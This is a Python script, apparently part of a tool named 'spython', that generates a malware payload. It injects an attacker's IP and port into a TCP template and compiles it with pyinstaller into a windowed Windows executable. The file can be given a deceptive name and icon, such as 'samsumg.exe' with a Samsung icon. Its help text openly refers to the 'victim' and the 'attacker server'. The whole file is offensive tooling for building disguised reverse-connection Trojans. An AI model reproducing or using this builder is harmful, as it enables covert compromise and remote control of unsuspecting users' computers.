import re
import subprocess
import argparse
import os
import sys
import ipaddress
import shutil

from time import sleep

def main():
    #Private constants
   __TEMPLATE_PATH = "templates/spython_tcp_template.py"
   __PAYLOAD_FILE_NAME =  "payload.py"
   __SIG_HOST = "SPYTHON_HOST"
   __SIG_PORT = "SPYTHON_PORT"
   
   FLAG = True
   if args.verbose:
       FLAG =False
   
   #Checks command line arguements
   if args.port >1000 and args.port < (2**16)-3:
      MAIN_PORT = args.port
   else:
      sys.stderr.write("Invalid port number")
      exit()
   try:
        IP=ipaddress.IPv4Address(args.host)
   except ipaddress.AddressValueError:
          sys.stderr.write("Invalid IPv4 address\n")
          exit()
   #Provides source code of payload
   TEMP = ""
   with open(__TEMPLATE_PATH,"r") as f:
         data = f.readlines()
         data = [i.replace(__SIG_HOST,f"\"{args.host}\"") for i in data]
         with open(__PAYLOAD_FILE_NAME,"w") as f2:
              for line in data:
                  f2.write(line)
         with open(__PAYLOAD_FILE_NAME, "r") as f2:
              new_data = f2.readlines()
              new_data = [ i.replace(__SIG_PORT,str(MAIN_PORT)) for i in new_data]
              TEMP = new_data
         with open(__PAYLOAD_FILE_NAME,"w") as f2:
              for i in TEMP:
                  f2.write(i)
              TEMP=""
   
   #improve code below, written for testing purposes
   print("[*]Generating payload...(This may take some time)")
   if args.icon:
      subprocess.run(f"pyinstaller --onefile --windowed --icon {args.icon}  {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
   else:
      subprocess.run(f"pyinstaller --onefile --windowed  {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
   
   sleep(1)
   
   if os.path.isdir("./build"): 
      shutil.rmtree("./build")
   if os.path.exists("payload.spec"):
      os.remove("payload.spec")
   print("[*]Payload generated !")
   if os.path.isdir("./dist"): 
    os.rename("dist/payload.exe","payload.exe")
    os.rmdir("dist")
   if args.name:
      os.rename((__PAYLOAD_FILE_NAME[:-2]+"exe"),f"./executables/{args.name}")


if __name__ == "__main__":
  #Parse command line arguments
  parse = argparse.ArgumentParser(description="This is an add-on for spython that generates the compiled version of the payload",
          formatter_class=argparse.RawDescriptionHelpFormatter,epilog=f"""Examples:
          {os.path.basename(sys.argv[0])} --main 5000 --name samsumg.exe --host 192.168.100.176
          {os.path.basename(sys.argv[0])} --main 5000 --name samsumg.exe --host --icon ./templates/samsung.ico 192.168.100.176""")
  parse.add_argument("-H","--host",required=True,type=str,dest="host",help="IP address victim shoudl connect to")
  parse.add_argument("-M","--main",required=False,type=int,dest="port",default=5000,help="Main port on attacker server, see docs for informations. Defaults to 5000")
  parse.add_argument("-N","--name",required=False,type=str,dest="name",default="payload",help="File name of payload object file, defaults to payload.exe")
  parse.add_argument("-v",required=False,action="store_true",dest="verbose",help="Verbose")
  parse.add_argument("-i","--icon",required=False,type=str,dest="icon",help="Icon for executable, note that it must be in .ico format")
  args = parse.parse_args()
  main()